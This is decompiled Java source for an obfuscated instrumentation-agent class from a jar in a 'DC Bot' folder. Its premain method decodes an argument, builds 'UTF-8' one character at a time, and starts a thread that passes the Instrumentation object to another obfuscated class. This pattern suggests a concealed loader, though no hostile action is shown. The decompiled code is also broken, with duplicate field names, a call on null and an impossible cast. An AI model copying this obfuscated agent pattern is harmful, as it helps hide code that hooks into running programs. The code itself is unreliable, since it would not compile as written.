package net.java;

import java.lang.instrument.Instrumentation;

public class f implements Runnable {
  private byte[] a;
  
  private Instrumentation a;
  
  public static void premain(String paramString, Instrumentation paramInstrumentation) {
    byte[] arrayOfByte = null;
    if (paramString != null)
      try {
        StringBuilder stringBuilder;
        (stringBuilder = new StringBuilder()).append('U');
        stringBuilder.append('T');
        stringBuilder.append('F');
        stringBuilder.append('-');
        stringBuilder.append('8');
        arrayOfByte = l.a(paramString.getBytes(stringBuilder.toString()));
      } catch (Exception exception) {
        null.printStackTrace();
      }  
    m.a();
    f f1;
    (f1 = new f()).a = (Instrumentation)arrayOfByte;
    f1.a = paramInstrumentation;
    (new Thread(f1)).start();
  }
  
  public void run() {
    l.a(new Object[] { this.a, this.a, Integer.valueOf(1), m.a.trim() });
  }
}


/* Location:              C:\Users\yanic\OneDrive\DC Bot\8tjpjeap.jar!\net\java\f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       1.1.3
 */